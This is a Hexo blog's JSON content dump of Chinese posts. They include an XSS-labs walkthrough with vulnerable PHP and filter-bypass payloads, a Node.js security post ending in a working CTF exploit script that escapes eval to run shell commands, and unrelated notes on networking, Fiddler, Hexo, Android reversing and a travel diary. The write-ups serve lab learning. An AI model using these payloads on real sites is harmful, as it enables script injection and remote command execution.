/&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt; 从代码中可以看出对一些关键词都进行了替换，但是好在没有对大写字母进行修改，因此可以使用单引号闭合，加大小写的脚本或者标签方法注入。 1http://127.0.0.1/level6.php?keyword=&quot;&gt;&lt;scRipt&gt;alert(/xss/)&lt;/scRipt&gt; 双写绕过123456789101112131415&lt;?php ini_set(&quot;display_errors&quot;, 0);$str =strtolower( $_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level7.php method=GET&gt;&lt;input name=keyword value=&quot;&#x27;.$str6.&#x27;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt; 它把特殊语义的字符串修改成了空字符串，我们就可以使用双写的方法进行注入。 1http://127.0.0.1/level7.php?keyword=&quot;&gt;&lt;scrscriptipt&gt;alert(/xss/)&lt;/scrscriptipt&gt; 字符实体后台代码 12345678910111213141516&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);echo &#x27;&lt;center&gt;&lt;form action=level8.php method=GET&gt;&lt;input name=keyword value=&quot;&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt; 由于会被htmlspecialchars函数转义，所以可将所有字符编码为HTML实体，从而绕过。 HTML实体 HTML编码转换 在文本框输入javasc&amp;#114;ipt:alert(/xss/) 检测关键字存在后台代码 1234567891011121314151617181920212223242526&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);echo &#x27;&lt;center&gt;&lt;form action=level9.php method=GET&gt;&lt;input name=keyword value=&quot;&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt;&lt;?phpif(false===strpos($str7,&#x27;http://&#x27;))&#123; echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;; &#125;else&#123; echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;.$str7.&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;&#125;?&gt; 这里的strpos函数是用来查找指定文本在字符串中第一次出现的位置，这时候我们就不得不在代码里加入http://，但是并没有过滤HTML实体编码，所以还是使用编码绕过 使用过滤HTML实体编码，但是由于需要加入http://，肯定不能在http://后面加代码，必须在前面，并且将http://注释掉才能执行 在文本框输入javasc&amp;#114;ipt:alert(/xss/)//http:// 检测关键字存在先测试一下最基本的xss注入，&lt;script&gt;alert(123)&lt;/acript&gt;,发现没有效果 看网页发现不了关键信息，就查看网页源代码可以发现有一个隐藏的表单,其中含有t_link t_history t_sort这样三个隐藏的&lt;input&gt;标签 构造语句，查看哪个标签可以被突破 1?keyword=&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&amp;t_link=&quot; type=&quot;text&quot;&quot;&amp;t_history=&quot; type=&quot;text&quot;&quot;&amp;t_sort=&quot; type=&quot;text&quot;&quot; 可以发现name为t_sort的&lt;input&gt;标签被改变，于是进行尝试对这个标签注入，构造如下代码 12?keyword=&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert(&#x27;xss&#x27;)# 注意这里由于没有文本框，需要在将&lt;input name=&quot;t_sort&quot; value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;这行的type值改成text 注入成功 后台代码： 1234567891011121314&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str11 = $_GET[&quot;t_sort&quot;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot; value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot; value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot; value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt; Referer信息跟上面的很相似，所以用上面的注入代码尝试一下，发现没有成功，查看网页源代码，可以发现双引号被转义。没有办法，先查看源码，可以发现对str11的过滤并不是很严谨 12345678910111213141516&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_SERVER[&#x27;HTTP_REFERER&#x27;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot; value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot; value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot; value=&quot;&#x27;.htmlspecialchars($str00).&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_ref&quot; value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt; 可以通过抓包工具进行抓包，然后修改里面的referer字段referer:&quot;type=&quot;text&quot; onclick=&quot;alert(&#39;xss&#39;) 最后注入成功 user-agent信息和上题一样的思路，只是将注入点改成UA Cookie信息和上题一样的思路，只是将注入点改成Cookie字段上。 exif xss没做出来，然后百度发现说这种情况很少 ng-include属性第一眼在url里尝试加入&lt;script&gt;alert(123)&lt;/script&gt;,没有效果，开始查看源码，可以发现我们输入的值被传入&lt;span&gt;标签的class属性中，同时&lt;,&gt;,&#39;被转义&lt;span&gt;标签前面还有ng-include这样的字符。 ng-include是angular js中的东西，其作用相当于php的include函数。这里就是将后面输入的文件给包含进来。 因此，我们的注入方法是 利用ng-include指令的特性包含一个有漏洞的html文件，注意这里有对尖括号的过滤。 构造如下代码进行注入 1?src=&#x27;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#x27; 这里参数值算是一个地址，所以需要添加引号。因为我们不是单纯的去包含level1.php，而是在后面添加了name参数值的。这就有点像是在访问了该参数值中地址之后把它响应在浏览器端的 html文件给包含进来的意思。 空格==回车第一眼在url里尝试加入&lt;script&gt;alert(123)&lt;/script&gt;,没有效果，开始查看网页源码，可以发现关键字script以及 / 和空格都被编码成同样的空格字符实体. 查看源代码 123456789&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);$str5=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str4);echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;?&gt; 空格、反斜杠、script都被str_replace函数替换成&amp;nbsp,所以我们考虑用空格来将它们分开，从而避免被替换。而%0a或者%0D当成空格使用，在HTML中这样是合法的 注入语句：http://192.168.226.128/xss-labs-master/level16.php?keyword=&lt;a%0Ahref=&#39;javas%0Acript:alert(&quot;xss&quot;)&#39;&gt;xss 合二为一在url里尝试加入&lt;script&gt;alert(123)&lt;/script&gt;,没有效果，开始查看网页源码,可以发现提交的两个参数的值出现在了标签的src属性值中，同时构造的代码中关键字都被编码。 仔细观察一下，发现&lt;embed&gt;标签就是引入一个swf文件到浏览器端，并且它的src属性值没有添加引号，所以不用闭合 注入语句： 12http://192.168.111.138/xss-labs-master/level17.php?arg01= onmousemove&amp;arg02=javascript:alert(/xss/)#注意在arg01这里要添加空格，不然就是将属性与之前的xsf01.swf?进行连接了 level 18思路与上面的类似，只是换了一张不同的图片。注入语句： 1http://192.168.111.138/xss-labs-master/level18.php?arg01= onmousemove&amp;arg02=javascript:alert(/xss/) level 19level 20这两题都很类似，先看网页源代码。src的值使用双引号括起来的，如果想要成功执行js代码肯定需要去闭合标签，但是此处会用htmlspecialchars()函数进行处理，所以无法成功闭合,这就涉及一种xss攻击手段叫做flash xss,具体以后再研究","categories":[],"tags":[{"name":"xss、靶场、题解","slug":"xss、靶场、题解","permalink":"http://yejuns.github.io/tags/xss%E3%80%81%E9%9D%B6%E5%9C%BA%E3%80%81%E9%A2%98%E8%A7%A3/"}]},{"title":"计算机网络复习笔记","slug":"计算机网络-复习笔记","date":"2020-12-31T08:01:51.000Z","updated":"2021-06-22T08:18:34.386Z","comments":true,"path":"2020/12/31/计算机网络-复习笔记/","link":"","permalink":"http://yejuns.github.io/2020/12/31/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"ARP协议arp协议即地址解析协议，是根据IP地址获取物理地址的一个TCP/IP协议。它可以解决同一个局域网内主机或路由器的IP地址和MAC地址的映射问题。 arp协议在TCP/IP模型中属于IP层(网络层),原因在于ARP协议属于TCP/IP协议簇，而在TCP/IP模型中，所有定义的协议至少是在网际层（或称网络层，IP层） 在OSI模型中属于链路层,按照OSI的标准,当数据向下传递时,每层会加上自己的信息,各层互不干扰.这样当网络层的IP包进入链路层时,链路层该如何加这个头部的目标信息呢?它要依靠ARP协议来完成.显然如何加链路头并不是网络层的功能。而且，ARP协议工作时，并不使用IP的包头。所以也有很多人说，ARP是链路层的 TCP连接与断开TCP状态（SYN、FIN、ACK） SYN(Synchronize) 建立连接 FIN 断开连接 ACK 表示响应 PSH 有DATA数据传输 RST 连接重置 如果出现SYN/FIN包的组合，很有可能这是一个攻击，因为SYN和FIN不应该一起出现 三次握手过程1、（B）-&gt;[SYN] -&gt; (A) 当客户机B和服务器A通信时，B首先向A发送一个SYN标识的包，告诉A建立连接；(SYN包就是仅SYN标记标为1的TCP包) 2、（B）&lt;-[SYN/ACK] &lt;- (A) 接着，A收到后会发一个对SYN包的确定包（SYN/ACK）回去，表示对第一个SYN包的确定，并继续握手协议 3、（B）-&gt;[ACK] -&gt; (A)B收到SYN/ACK包，B发一个确认包（ACK），通知连接已经建立。至此，三次握手完成。 四次挥手过程1、(B) -&gt; FIN+ack -&gt; (A) 2、(B) &lt;- ACK &lt;- (A) 3、(B) &lt;- FIN+ACK &lt;- (A) 4、(B) -&gt; ACK -&gt; (A) 因为TCP连接是双向连接，因此关闭连接需要在两个方向上做。 四次挥手不是关闭TCP连接的唯一方式，有时主机需要尽快关闭连接（或连接超时、主机不可达），RST包将被发送，因为RST包是不需要接收方确认的，所以RST包对于ACK可带可不带。 HTTPS建立连接的过程https是在http的基础上和ssl/tls证书结合的一种协议，保证了传输过程中的安全性，解决了http的3个缺点（被监听、被篡改、被伪装） http与httpsHTTP和HTTPS都建立在连接的基础上进行数据传输，都基于TCP，建立连接都要经过3次握手 当在浏览器中输入地址后，会先根据浏览器DNS缓存、本地DNS缓存、和HOST中寻找对应的记录，如果没有找到会请求DNS服务来获取对应的ip 建立连接的过程 客户端发送请求到服务器，告诉自己支持的加密协议以及版本 服务端选择合适的加密协议，返回一个证书给客户端，证书里面有公钥 客户端接收公钥后验证证书的安全性，如果通过会生成一个随机数，用公钥对其机密后发送到服务端 服务端接收到加密后的随机数，用私钥解密后得到真正的随机数，然后用这个随机数当秘钥（对称秘钥）对需要发送的数据进行加密 客户端接收到加密的数据后使用生成的随机数（对称秘钥）对数据进行解密，将结果呈现","categories":[],"tags":[{"name":"计算机网络","slug":"计算机网络","permalink":"http://yejuns.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}]},{"title":"web安全之nodeJs","slug":"web安全之nodejs","date":"2020-09-21T08:01:51.000Z","updated":"2021-05-19T16:22:28.638Z","comments":true,"path":"2020/09/21/web安全之nodejs/","link":"","permalink":"http://yejuns.github.io/2020/09/21/web%E5%AE%89%E5%85%A8%E4%B9%8Bnodejs/","excerpt":"","text":"最近在学习nodeJs，发现一些有趣的地方，总结一下 原型链自己写了相关的博客，看这边 弱类型类似php，直接看例子理解吧 123456console.log(1==&#x27;1&#x27;); //trueconsole.log(2&gt;&#x27;3&#x27;); //falseconsole.log(&#x27;1&#x27;&lt;&#x27;2&#x27;); //trueconsole.log(111&gt;&#x27;3&#x27;); //trueconsole.log(&#x27;111&#x27;&gt;&#x27;3&#x27;); //falseconsole.log(&#x27;ads&#x27;&gt;1); //false 总结：数字与字符串比较时，会优先将纯数字型字符串转为数字之后再进行比较；而字符串与字符串比较时，会将字符串的第一个字符转为ASCII码之后再进行比较，因此就会出现第五行代码的这种情况；而非数字型字符串与任何数字进行比较都是false。 1234567console.log([]==[]); //falseconsole.log([]&gt;[]); //falseconsole.log([]&lt;[]); //falseconsole.log([7,2]&gt;[5]); //trueconsole.log([100,2]&lt;&#x27;test&#x27;); //trueconsole.log([1,2]&lt;&#x27;2&#x27;); //trueconsole.log([11,16]&lt;&quot;10&quot;); //false 总结：空数组之间比较永远为false，数组之间比较只比较数组间的第一个值，对第一个值采用前面总结的比较方法，数组与非数值型字符串比较，数组永远小于非数值型字符串；数组与数值型字符串比较，取第一个之后按前面总结的方法进行比较. 一些比较特别的相等 1234console.log(null==undefined) // 输出：trueconsole.log(null===undefined) // 输出：falseconsole.log(NaN==NaN) // 输出：falseconsole.log(NaN===NaN) // 输出：false 变量拼接 1234console.log(5+[6,6]); //56,3console.log(&quot;5&quot;+6); //56console.log(&quot;5&quot;+[6,6]); //56,6console.log(&quot;5&quot;+[&quot;6&quot;,&quot;6&quot;]); //56,6 模块加载与命令执行在一些沙盒逃逸时我们通常是找到一个可以执行任意命令的payload，若是在ctf比赛中，我们需要getflag时通常是需要想尽办法加载模块来达成特殊要求。通过child_process模块来加载模块，获得exec，execfile，execSync。（child_process模块用来启动一个新的进程，一般用在处理一些定时执行的操作） 通过require加载模块如下： require(&#39;child_process&#39;).exec(&#39;calc&#39;); 通过global对象加载模块global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;calc&#39;); 有些情况下可以直接用require，如eval。 1234eval(&quot;require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;);&quot;);setInterval(require(&#x27;child_process&#x27;).exec,1000,&quot;calc&quot;);setTimeout(require(&#x27;child_process&#x27;).exec,1000,&quot;calc&quot;);Function(&quot;global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;)&quot;)(); 大小写特性ES6模板字符串可以使用反引号替代括号执行函数，如: 1alert`test!!` 可以用反引号替代单引号双引号，可以在反引号内插入变量，如： 12var fruit = &quot;apple&quot;;console.log`i like $&#123;fruit&#125; very much`; 模板字符串是将我们的字符串作为参数传入函数中，而该参数是一个数组，该数组会在遇到${}时将字符串进行分割，具体为下： 123456[&quot;i like &quot;, &quot; very much&quot;, raw: Array(2)]0: &quot;i like &quot;1: &quot; very much&quot;length: 2raw: (2) [&quot;i like &quot;, &quot; very much&quot;]__proto__: Array(0) 实战这道题取自NPUCTF的验证码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778const express = require(&#x27;express&#x27;);const bodyParser = require(&#x27;body-parser&#x27;);const cookieSession = require(&#x27;cookie-session&#x27;);const fs = require(&#x27;fs&#x27;);const crypto = require(&#x27;crypto&#x27;);const keys = require(&#x27;./key.js&#x27;).keys;function md5(s) &#123; return crypto.createHash(&#x27;md5&#x27;) .update(s) .digest(&#x27;hex&#x27;);&#125;function saferEval(str) &#123; if (str.replace(/(?:Math(?:\\.\\w+)?)|[()+\\-*/&amp;|^%&lt;&gt;=,?:]|(?:\\d+\\.?\\d*(?:e\\d+)?)| /g, &#x27;&#x27;)) &#123; return null; &#125; return eval(str);&#125; // 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个const template = fs.readFileSync(&#x27;./index.html&#x27;).toString();function render(results) &#123; return template.replace(&#x27;&#123;&#123;results&#125;&#125;&#x27;, results.join(&#x27;&lt;br/&gt;&#x27;));&#125;const app = express();app.use(bodyParser.urlencoded(&#123; extended: false &#125;));app.use(bodyParser.json());app.use(cookieSession(&#123; name: &#x27;PHPSESSION&#x27;, // 2020.3/WORKER2 嘿嘿， keys&#125;));Object.freeze(Object);Object.freeze(Math);app.post(&#x27;/&#x27;, function (req, res) &#123; let result = &#x27;&#x27;; const results = req.session.results || []; const &#123; e, first, second &#125; = req.body; if (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])) &#123; if (req.body.e) &#123; try &#123; result = saferEval(req.body.e) || &#x27;Wrong Wrong Wrong!!!&#x27;; &#125; catch (e) &#123; console.log(e); result = &#x27;Wrong Wrong Wrong!!!&#x27;; &#125; results.unshift(`$&#123;req.body.e&#125;=$&#123;result&#125;`); &#125; &#125; else &#123; results.unshift(&#x27;Not verified!&#x27;); &#125; if (results.length &gt; 13) &#123; results.pop(); &#125; req.session.results = results; res.send(render(req.session.results));&#125;);app.get(&#x27;/source&#x27;, function (req, res) &#123; res.set(&#x27;Content-Type&#x27;, &#x27;text/javascript;charset=utf-8&#x27;); res.send(fs.readFileSync(&#x27;./index.js&#x27;));&#125;);app.get(&#x27;/&#x27;, function (req, res) &#123; res.set(&#x27;Content-Type&#x27;, &#x27;text/html;charset=utf-8&#x27;); req.session.admin = req.session.admin || 0; res.send(render(req.session.results = req.session.results || []))&#125;);app.listen(80, &#x27;0.0.0.0&#x27;, () =&gt; &#123; console.log(&#x27;Start listening&#x27;)&#125;); 首先看到saferEval函数，我们看到只要绕过正则之后就可以利用在代码执行处所说的eval来执行代码；在此之前看看调用了saferEval的地方，这里要绕过就需要利用到前面说的弱类型了 1if (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp;md5(first+keys[0]) === md5(second+keys[0])) first和second都是我们可控的，这里要我们first和second不相等但长度又需要相等，同时还要在最后加上key之后进行md5要相等，要符合一系列条件较难，然而弱类型帮了一把。 md5处使用了变量的拼接，因此我们可以利用类似&#39;a&#39;+key[0]==[&#39;a&#39;]+key[0]进行绕过，而且关键在于first和second的比较使用了!===。这也给绕过提供了帮助。 抓包时候会发现是默认请求类型是x-www-form-urlencoded，无法传输数组，但因为这里使用了body-parser模块内的json，因此可以改下头application/json。 123456789101112#-*- coding:utf-8 -*-#__author__: HhhMimport requestsimport jsonprint(&quot;Start the program:&quot;)url = &quot;http://xxx/&quot;headers = &#123;&quot;Content-Type&quot;: &quot;application/json&quot;&#125;data = json.dumps(&#123;&#x27;e&#x27;: &quot;1+1&quot;, &quot;first&quot;: [1], &quot;second&quot;: &quot;1&quot;&#125;)r = requests.post(url, headers=headers, data=data)print(r.text) 输出为2，证明前面成功绕过了，接下来考虑saferEval，看看正则： 1str.replace(&#x2F;(?:Math(?:\\.\\w+)?)|[()+\\-*&#x2F;&amp;|^%&lt;&gt;&#x3D;,?:]|(?:\\d+\\.?\\d*(?:e\\d+)?)| &#x2F;g, &#39;&#39;) 我们需要让我们的正则符合他的要求，利用前两个正则我们可以构造出如：(Math)，Math.xxx(xxx) 也支持使用arrow function（箭头函数），我们可以使用箭头函数配合Math通过原型获取到Function，使用我上面提到的Function，通过global一路调出来exec执行任意命令。 1Math&#x3D;&gt;(Math&#x3D;Math.constructor,Math.constructor) 这样虽然可以得到Function，但限于正则我们无法执行命令，这里绕过采用String.fromCharCode，String可以通过变量拼接拼接出一个字符串，再调用constructor获取到String对象。因此exp如下: 12345678910111213141516171819#-*- coding:utf-8 -*-#__author__: HhhMimport requestsimport jsonimport redef payload(): s = &quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)&quot; return &#x27;,&#x27;.join([str(ord(i)) for i in s])a = payload()print(&quot;Start the program:&quot;)url = &quot;http://xxx/&quot;headers = &#123;&quot;Content-Type&quot;: &quot;application/json&quot;&#125;e = &quot;(Math=&gt;(Math=Math.constructor,Math.constructor(Math.fromCharCode(&#123;0&#125;))()))(Math+1)&quot;.format(a)data = json.dumps(&#123;&#x27;e&#x27;: e, &quot;first&quot;: [1], &quot;second&quot;: &quot;1&quot;&#125;)r = requests.post(url, headers=headers, data=data)print(r.text)","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"fiddler安装以及使用","slug":"fiddler使用","date":"2020-02-21T06:01:51.000Z","updated":"2021-05-07T16:11:37.461Z","comments":true,"path":"2020/02/21/fiddler使用/","link":"","permalink":"http://yejuns.github.io/2020/02/21/fiddler%E4%BD%BF%E7%94%A8/","excerpt":"","text":"fiddler简介Fiddler是位于客户端和服务器端的HTTP代理，也是目前最常用的http抓包工具之一 。 它能够记录客户端和服务器之间的所有 HTTP请求，可以针对特定的HTTP请求，分析请求数据、设置断点、调试web应用、修改请求的数据，甚至可以修改服务器返回的数据，功能非常强大，是web调试的利器。 fiddler是代理，也就是说：客户端的所有请求都要先经过Fiddler，然后转发到相应的服务器，反之，服务器端的所有响应，也都会先经过Fiddler然后发送到客户端，基于这个原因，Fiddler支持所有可以设置http代理为127.0.0.1:8888的浏览器和应用程序。（如果本地启用了ssr等代理软件，如何开启fiddler，后面会讲到） fiddler安装","categories":[],"tags":[{"name":"fiddler,","slug":"fiddler","permalink":"http://yejuns.github.io/tags/fiddler/"}]},{"title":"我的义工之旅——涠洲岛","slug":"我的义工之旅——涠洲岛","date":"2020-02-02T06:57:59.000Z","updated":"2021-05-05T23:52:04.097Z","comments":true,"path":"2020/02/02/我的义工之旅——涠洲岛/","link":"","permalink":"http://yejuns.github.io/2020/02/02/%E6%88%91%E7%9A%84%E4%B9%89%E5%B7%A5%E4%B9%8B%E6%97%85%E2%80%94%E2%80%94%E6%B6%A0%E6%B4%B2%E5%B2%9B/","excerpt":"","text":"在涠洲岛的义工旅行生活大年初一，就想着自己要是没什么事，可以找个地方去义工旅行逛一逛。正值2月份，大半个中国还处于”倒春寒“的时期，自己不愿意去太冷的地方，于是选择去的地方就只有两广以及海南了。加上去年已经去过三亚，所以最后还是决定去广西的涠洲岛。于是，便开始在豆瓣上寻找商家。 鉴于前几次的义工都属于自己一个找了个地方玩，今年就打算找个人多点的地，至于学习，那就是回学校该考虑的事情。找了很多家店，最后确定的是“天生自由”。很偶然的选择，最终带给了自己不一样的感受。不得不说，有时候真的是有心栽花花不成，无心插柳柳成荫。从前的几次义工之旅，自己想找个安静的店然后空余时间来学习，最终大部分时间都是自己一个人独处，然后玩手机看小说，而这次想找一个热闹的地方，最后却还是一个人在店里看书，有时候不得不感叹人生际遇的奇妙。 评价一下这次涠洲之旅的几个朋友吧，秀姐：很懂得享受生活的一个人，大方，较好相处，情商颇高small fang：有些无知，很容易被男人忽悠，渴望爱情C H：会交朋友，但是没有担当，渣男fly brother：会做菜，但是各种料放得太多，导致菜的味道失去了原味渣女：四川妹子，性格有点意思，但是看其穿着打扮应该不是有钱人，有点像 “夏天午后，路边那个手里拿着西瓜刀，脚上穿着人字拖的少女”庭姐：有自己的想法，比较佩服。舟舟：对我第一天的态度和最后一天的态度很不一样，我搞不明白这个人想什么，看她到时候会不会来南京再进一步确定吧。 在岛上的这几天，去了酒吧、迪厅，开了游船，吃了皮皮虾，真的可以说体验了很多以前都没有体验到的快乐。而收获最多的，大概就是自己不在急着脱单找对象，也更加深入地了解了自己，出去走走还是很有必要的。所以自己打算5月份再去新疆一个月，不过自己必须在此之前把论文和实验搞定，压力山大，但是我觉得自己可以做到的。希望这个flag没问题。","categories":[],"tags":[{"name":"义工旅行","slug":"义工旅行","permalink":"http://yejuns.github.io/tags/%E4%B9%89%E5%B7%A5%E6%97%85%E8%A1%8C/"}]},{"title":"hexo命令和theme pure的使用","slug":"hexo设置","date":"2019-12-31T08:01:51.000Z","updated":"2021-07-01T13:47:40.147Z","comments":true,"path":"2019/12/31/hexo设置/","link":"","permalink":"http://yejuns.github.io/2019/12/31/hexo%E8%AE%BE%E7%BD%AE/","excerpt":"","text":"建站 hexo init &lt; folder &gt; cd &lt; folder &gt; npm install 最后会生成这样的项目，其结构如下 123456789.├── _config.yml 网站的配置信息├── package.json 应用程序的信息├── scaffolds 模版文件夹├── source 资源文件夹是存放用户资源的地方| ├── _drafts| └── _posts└── themes 主题文件夹 常用的命令 hexo init [folder] #初始化 hexo new [layout] &lt;title&gt; hexo generate hexo g hexo publish [layout] &lt; filename &gt; hexo server –port –static –log hexo deploy hexo clean hexo list &lt;list&gt; Pure主题pure官方文档使用pure主题1、使用git下载theme，然后将相关代码复制到theme目录下的pure文件夹中 git clone https://github.com/cofess/hexo-theme-pure.git themes/pure 2、修改hexo目录下的 _config.yml 文件，修改其中的 theme：pure 3、安装相关npm插件（需要进入hexo目录下，输入相关代码） npm install hexo-wordcount –save npm install hexo-generator-json-content –save npm install hexo-generator-feed –save npm install hexo-generator-sitemap –save npm install hexo-generator-baidu-sitemap –save 4、相关博客","categories":[],"tags":[{"name":"hexo使用","slug":"hexo使用","permalink":"http://yejuns.github.io/tags/hexo%E4%BD%BF%E7%94%A8/"}]},{"title":"Android逆向 一 基础知识","slug":"Android逆向第一课","date":"2018-12-31T08:01:51.000Z","updated":"2021-06-04T02:50:43.613Z","comments":true,"path":"2018/12/31/Android逆向第一课/","link":"","permalink":"http://yejuns.github.io/2018/12/31/Android%E9%80%86%E5%90%91%E7%AC%AC%E4%B8%80%E8%AF%BE/","excerpt":"","text":"最近自己在学习Android的逆向，把学习的过程记录一下，方便新手入门 1、预备工具JAVA环境： 官方下载安装地址: https://www.oracle.com/technetwork/java/javase/downloads/index.html （现在android开发还是用Java比较多，虽然google在推广Kotlin） apktool： https://ibotpeaches.github.io/Apktool/ 是apktool.jar 要安装Java环境才能运行 JADX： https://www.softpedia.com/get/Programming/Other-Programming-Files/Jadx.shtml .exe文件，目录里可以直接双击运行 Java SDK自带：keytool（证书工具）、jarsigner（签名工具） 2、基础知识JAVA源代码文件是XXX.javaJAVA是编译性语言，编译后才能运行，编译后的文件是XXX.class （class文件是可执行文件，jar包里就是.class文件），JAVA虚拟机运行的就是XXX.class文件 安卓虚拟机下面是运行的是xxx.dex，dex是安卓里可执行文件（.dex文件是安卓环境下运行的可执行文件） .smali文件是将.dex文件反编译得到的文件，具有特定的语法格式（因为android系统使用自己的dalvik虚拟机，代码最终编译后生成的是.dex文件） Android程序的安装包是一个APK文件，APK是一个压缩文件，用zip压缩解压，解压后的主要文件有：assets：资源文件(图片，网页，视频)，不会被编译。res：资源文件（静态文本，图片，关键资源） 会被编译。lib：.so库，系统库，自己打包的库。有的把加密/token生成方式放在.so文件里 META-INF：签名信息。AndroidManifest.xml：配置信息（关键），举例修改权限；同时定义了一些程序入口 classes.dex：android dalvik虚拟机可执行文件 resources.arsc：资源索引/对应文件 \\ 2.1、apktool使用apktool d test.apk 反编译test.apk包（d: decode） apktool b test 将反编译后的文件重新打包(b:build) 使用zip对APK解压后，会发现各个文件是乱码，无法去读 使用apktool反编译后，才可以去正常地读取信息 使用apktool反编译后，我们就可以得到关于应用的.smali文件,对smali文件进行修改，然后就可以重新打包成新的应用。 关于class、dex、smali文件之间的转换，可以看下图 为什么不将整个应用之间完全反编译为java文件，这样可读性更好？因为我们并不知道APP在编译时的java版本、各种环境，直接将修改反编译后的class文件，很容易出现重新构建的APP无法运行的情况。因此对编译后的smali文件进行修改后，打包后就可以直接运行。 2.2、jadx使用","categories":[],"tags":[{"name":"Android、逆向","slug":"Android、逆向","permalink":"http://yejuns.github.io/tags/Android%E3%80%81%E9%80%86%E5%90%91/"}]}],"categories":[],"tags":[{"name":"2020 